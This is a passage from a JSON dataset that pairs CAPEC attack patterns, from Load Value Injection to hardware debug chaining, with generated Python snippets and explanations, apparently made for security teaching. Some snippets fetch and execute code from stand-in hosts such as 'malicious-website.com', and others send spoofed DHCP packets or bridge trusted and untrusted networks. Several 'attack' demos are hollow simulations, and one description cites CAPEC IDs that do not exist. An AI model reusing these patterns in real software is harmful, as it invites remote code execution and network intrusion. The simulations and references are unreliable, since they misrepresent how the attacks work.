        "code_snippet": "import requests\nimport subprocess\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-426: Untrusted Search Path\nsubprocess.run(['python', 'malicious_script.py'])",
        "description": "This Python code snippet demonstrates a scenario where an adversary can exploit the 'Repo Jacking' vulnerability. The code downloads a Python script from a remote URL without verifying its integrity (CWE-494). It then executes the downloaded script directly (CWE-829), which could include malicious functionality. Finally, it runs the script using an untrusted search path (CWE-426), which could lead to the execution of unintended or malicious code. This snippet highlights the risks of incorporating code from untrusted sources and the importance of verifying the integrity and origin of external code."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "import ctypes\nimport mmap\nimport os\nimport struct\n\n# Allocate a memory page\npage_size = mmap.PAGESIZE\nfd = os.open('/dev/zero', os.O_RDWR)\nmem = mmap.mmap(fd, page_size, mmap.MAP_PRIVATE, mmap.PROT_READ | mmap.PROT_WRITE)\nos.close(fd)\n\n# Induce a page fault by accessing an invalid address\ntry:\n    invalid_address = ctypes.c_void_p(0xdeadbeef)\n    ctypes.string_at(invalid_address, 1)\nexcept ValueError:\n    pass\n\n# Simulate transient execution by accessing microarchitectural buffers\n# This is a simplified representation and does not perform actual transient execution\nbuffer = struct.pack('Q', 0x4141414141414141)  # Adversary-controlled data\nmem.write(buffer)\n\n# Read the data back, simulating a side-channel attack\nmem.seek(0)\nleaked_data = mem.read(8)\nprint(f'Leaked data: {leaked_data}')",
        "description": "This Python code snippet demonstrates a simplified version of a Load Value Injection (LVI) attack. The code allocates a memory page and induces a page fault by accessing an invalid address. It then simulates transient execution by writing adversary-controlled data to a microarchitectural buffer. Finally, it reads the data back, representing a side-channel attack to leak sensitive information. This example embodies the main idea of CAPEC-1342, CAPEC-1423, CAPEC-1422, and CAPEC-1421 by showing how an adversary can exploit transient execution and microarchitectural state to expose sensitive information."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "import socket\nimport struct\n\n# DHCP packet structure\nDHCP_DISCOVER = b'\\x01\\x01\\x06\\x00' + b'\\x00' * 28 + b'\\x63\\x82\\x53\\x63' + b'\\x35\\x01\\x01' + b'\\xff' * 192\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\nsock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n\n# Bind to the DHCP server port\nsock.bind(('0.0.0.0', 67))\n\n# Send the spoofed DHCP discover packet\nsock.sendto(DHCP_DISCOVER, ('<broadcast>', 68))\n\n# Listen for DHCP responses\nwhile True:\n    data, addr = sock.recvfrom(1024)\n    if data[240:244] == b'\\x63\\x82\\x53\\x63':  # Check for DHCP magic cookie\n        print(f'Received DHCP response from {addr}')\n        # Process the response (e.g., extract offered IP address)\n        offered_ip = socket.inet_ntoa(data[16:20])\n        print(f'Offered IP: {offered_ip}')",
        "description": "This Python code snippet demonstrates a basic DHCP spoofing attack. It creates a raw socket to send a spoofed DHCP Discover packet, masquerading as a legitimate DHCP client. The code then listens for DHCP responses from any DHCP server on the network. When a response is received, it checks for the DHCP magic cookie to validate the response and extracts the offered IP address. This code embodies the main idea of CAPEC-290 (DHCP Spoofing) by illustrating how an adversary can spoof DHCP traffic to redirect network traffic or deny service. The related CWEs are represented by the lack of proper endpoint verification (CWE-923), reliance on IP address for authentication (CWE-291), and potential for capture-replay attacks (CWE-294)."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "import requests\nimport os\nimport importlib.util\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_extension.py'\nresponse = requests.get(url)\n\n# Save the downloaded file\nwith open('malicious_extension.py', 'wb') as file:\n    file.write(response.content)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nspec = importlib.util.spec_from_file_location('malicious_extension', 'malicious_extension.py')\nmalicious_extension = importlib.util.module_from_spec(spec)\nspec.loader.exec_module(malicious_extension)\n\n# CWE-507: Trojan Horse\n# The malicious extension might perform some benign actions\nmalicious_extension.benign_function()\n\n# CWE-506: Embedded Malicious Code\n# The malicious extension might also perform some hidden malicious actions\nmalicious_extension.hidden_malicious_function()\n\n# CWE-426: Untrusted Search Path\n# Manipulate the search path to include untrusted directories\nos.environ['PATH'] += os.pathsep + '/untrusted_directory'",
        "description": "This Python code snippet demonstrates the concept of 'Install Malicious Extension' by downloading and executing a potentially malicious extension from an untrusted source. The code does not perform any integrity checks on the downloaded file (CWE-494), includes functionality from an untrusted control sphere (CWE-829), and assumes the extension contains both benign and hidden malicious functions (CWE-507 and CWE-506). Additionally, it manipulates the search path to include untrusted directories (CWE-426). This snippet highlights the risks associated with installing and executing code from untrusted sources."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Simulate sensitive data being transmitted in cleartext\nsensitive_data = 'Sensitive Information'\n\n# Create a UDP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nserver_address = ('localhost', 10000)\n\ntry:\n    # Send data in cleartext\n    print(f'Sending: {sensitive_data}')\n    sent = sock.sendto(sensitive_data.encode(), server_address)\n\n    # Simulate eavesdropping by capturing electromagnetic emissions\n    # This is a placeholder for the actual eavesdropping mechanism\n    def eavesdrop():\n        # Simulate capturing emissions\n        captured_data = sensitive_data\n        print(f'Eavesdropped data: {captured_data}')\n\n    # Simulate a delay to represent real-time data transmission\n    time.sleep(1)\n    eavesdrop()\n\nfinally:\n    sock.close()",
        "description": "This Python code snippet demonstrates the concept of 'Eavesdropping on a Monitor' by simulating the transmission of sensitive data in cleartext over a network and then 'eavesdropping' on that data. The code uses a UDP socket to send the sensitive data, representing a scenario where data is transmitted without encryption (CWE-319: Cleartext Transmission of Sensitive Information). The eavesdropping function simulates capturing the data through electromagnetic emissions, highlighting the lack of protection against physical side channels (CWE-1300: Improper Protection of Physical Side Channels). This example illustrates how an adversary could capture sensitive information without modifying any cables or installing software, impacting the confidentiality of the data."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "import socket\n\nclass NetworkBridge:\n    def __init__(self, trusted_ip, untrusted_ip, port):\n        self.trusted_ip = trusted_ip\n        self.untrusted_ip = untrusted_ip\n        self.port = port\n\n    def create_channel(self):\n        try:\n            # Create a socket to connect to the trusted network\n            trusted_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            trusted_socket.connect((self.trusted_ip, self.port))\n\n            # Create a socket to connect to the untrusted network\n            untrusted_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            untrusted_socket.connect((self.untrusted_ip, self.port))\n\n            # Bridge the two networks\n            while True:\n                data = trusted_socket.recv(1024)\n                if not data:\n                    break\n                untrusted_socket.sendall(data)\n\n                data = untrusted_socket.recv(1024)\n                if not data:\n                    break\n                trusted_socket.sendall(data)\n        except Exception as e:\n            print(f\"Error: {e}\")\n        finally:\n            trusted_socket.close()\n            untrusted_socket.close()\n\n# Example usage\nbridge = NetworkBridge('192.168.1.10', '10.0.0.10', 8080)\nbridge.create_channel()",
        "description": "This Python code snippet demonstrates a basic implementation of a network bridge that connects a trusted network to an untrusted network. The `NetworkBridge` class initializes with the IP addresses of the trusted and untrusted networks and a port number. The `create_channel` method establishes sockets to both networks and continuously transfers data between them, effectively bridging the two networks. This code embodies the main idea of the CAPEC 'Network Boundary Bridging' by creating a channel that bridges trusted and untrusted networks. The code is vulnerable to several weaknesses: it does not verify the identity of the endpoints (CWE-923, CWE-300), does not ensure message integrity (CWE-924), and mixes trusted and untrusted data (CWE-501)."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "import socket\nimport threading\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-830: Inclusion of Web Functionality from an Untrusted Source\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-345: Insufficient Verification of Data Authenticity\n\n# Simulate a remote desktop session in a web browser\nclass RemoteDesktopSession:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind((self.host, self.port))\n        self.server_socket.listen(5)\n        print(f'Server listening on {self.host}:{self.port}')\n\n    def handle_client(self, client_socket):\n        while True:\n            # CWE-294: Capture-replay vulnerability\n            data = client_socket.recv(1024)\n            if not data:\n                break\n            print(f'Received: {data}')\n            # Echo back the data (simulating a remote desktop session)\n            client_socket.sendall(data)\n\n    def start(self):\n        while True:\n            client_socket, addr = self.server_socket.accept()\n            print(f'Connection from {addr}')\n            client_handler = threading.Thread(target=self.handle_client, args=(client_socket,))\n            client_handler.start()\n\n# CWE-830: Including untrusted web functionality\n# This would be a part of the web client that connects to the remote desktop session\nhtml_code = '''\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Remote Desktop</title>\n</head>\n<body>\n    <h1>Remote Desktop Session</h1>\n    <script src=\"http://untrusted-source.com/remote-desktop.js\"></script>\n</body>\n</html>\n'''\n\n# Start the remote desktop server\nif __name__ == '__main__':\n    server = RemoteDesktopSession('0.0.0.0', 9999)\n    server.start()\n",
        "description": "This Python code snippet demonstrates a vulnerable remote desktop session setup that can be exploited using the Browser in the Middle (BiTM) attack. The server listens for incoming connections and echoes back any received data, simulating a remote desktop session. The code includes several vulnerabilities: \n1. CWE-602: The server relies on the client to enforce security, which is inherently insecure.\n2. CWE-830: The HTML code includes a script from an untrusted source, potentially allowing the adversary to control the session.\n3. CWE-294: The server is vulnerable to capture-replay attacks as it does not verify the authenticity of the data.\n4. CWE-345: The server does not sufficiently verify the origin or authenticity of the data, making it susceptible to accepting invalid data.\nThis setup can be exploited by an adversary to establish an unnoticed remote desktop connection in the victim's browser to the adversary's system."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "class DebugComponent:\n    def __init__(self, authorized=False):\n        self.authorized = authorized\n        self.debug_functions = ['read_registers', 'write_registers', 'inject_errors']\n\n    def access_debug_function(self, function_name):\n        if function_name in self.debug_functions:\n            if self.authorized:\n                print(f'Accessing {function_name}')\n            else:\n                print('Unauthorized access attempt detected!')\n        else:\n            print('Invalid debug function')\n\n# Example usage\n# Incorrectly assuming authorization for a group of functions\ndebug_component = DebugComponent(authorized=True)\ndebug_component.access_debug_function('read_registers')  # Authorized access\n\ndebug_component = DebugComponent(authorized=False)\ndebug_component.access_debug_function('write_registers')  # Unauthorized access\n\ndebug_component.access_debug_function('inject_errors')  # Unauthorized access\n",
        "description": "This Python code snippet represents a simplified model of a hardware debug component with incorrect chaining or granularity of debug components. The `DebugComponent` class has a list of debug functions and an authorization flag. The `access_debug_function` method checks if the function is in the list of debug functions and whether the user is authorized to access it. The example usage demonstrates both authorized and unauthorized access attempts. This code embodies the main idea of the CAPEC by showing how incorrect handling of authorization for a group of debug functions can lead to unauthorized access, which aligns with CWE-1296 and CWE-1191. The code also hints at potential issues like unauthorized error injection (CWE-1334) and improper management of sensitive operations."
    }
]